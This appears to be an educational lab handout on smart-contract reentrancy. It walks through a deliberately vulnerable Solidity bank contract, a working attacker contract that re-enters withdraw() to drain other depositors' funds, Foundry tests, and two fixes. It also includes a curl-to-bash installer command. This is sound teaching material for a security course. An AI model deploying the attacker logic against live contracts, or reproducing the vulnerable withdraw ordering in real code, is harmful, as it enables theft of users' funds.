# Lab 2 — Reentrancy Attack Reproduction

**Goal**: write a vulnerable Solidity contract, exploit it with an attacker contract, then fix using the checks-effects-interactions pattern.

**Time**: ~3 hours.

**Prereqs**: install Foundry (`curl -L https://foundry.paradigm.xyz | bash; foundryup`).

---

## Setup

```
forge init reentrancy-lab
cd reentrancy-lab
```

## Step 1 — Vulnerable bank

`src/Bank.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0;  // updated AFTER call ← vulnerability
    }

    receive() external payable {}
}
```

## Step 2 — Attacker

`src/Attacker.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Bank.sol";

contract Attacker {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = VulnerableBank(payable(_bank));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```

## Step 3 — Test the attack

`test/Reentrancy.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Bank.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;
    address alice = address(0xA);
    address bob   = address(0xB);

    function setUp() public {
        bank = new VulnerableBank();
        vm.deal(alice, 5 ether);
        vm.deal(bob, 1 ether);

        vm.prank(alice);
        bank.deposit{value: 5 ether}();

        vm.prank(bob);
        attacker = new Attacker(address(bank));
    }

    function testAttackDrainsBank() public {
        assertEq(address(bank).balance, 5 ether);
        vm.prank(bob);
        attacker.attack{value: 1 ether}();
        // Bank should be drained; attacker should hold ~6 ETH
        assertEq(address(bank).balance, 0);
        assertGe(address(attacker).balance, 5 ether);
    }
}
```

Run:
```
forge test -vvv
```

You should see the attacker drain Alice's 5 ETH + their own deposit.

## Step 4 — Fix with checks-effects-interactions

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "no balance");
    balances[msg.sender] = 0;            // effect FIRST
    (bool ok,) = msg.sender.call{value: bal}("");
    require(ok, "transfer failed");
}
```

Re-run tests. The drain should fail. Add a passing test that proves the bank is no longer drainable:

```solidity
function testAttackFails() public {
    vm.prank(bob);
    vm.expectRevert();
    attacker.attack{value: 1 ether}();
    assertEq(address(bank).balance, 5 ether);
}
```

## Step 5 — Alternative fix: ReentrancyGuard

Use OpenZeppelin's mutex:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    // ...
    function withdraw() external nonReentrant { ... }
}
```

Discuss in your journal:
- Which fix is cheaper in gas?
- Which fix protects against **cross-function** reentrancy?

---

## Deliverable

- `src/Bank.sol`, `src/Attacker.sol`, `test/Reentrancy.t.sol` (both attack-succeeds and attack-fails tests).
- A 1-page postmortem explaining the bug class and listing 2 other real-world incidents where it appeared (e.g., DAO 2016, Curve July 2023, dForce, Cream).

## Stretch

- Modify the bank to use `transfer()` (which forwards 2300 gas). Does it still get drained? Discuss why `transfer()` is no longer recommended (post-Istanbul gas changes).
- Add an invariant test: `bank balance >= sum(balances)`. Run `forge test --invariant`.
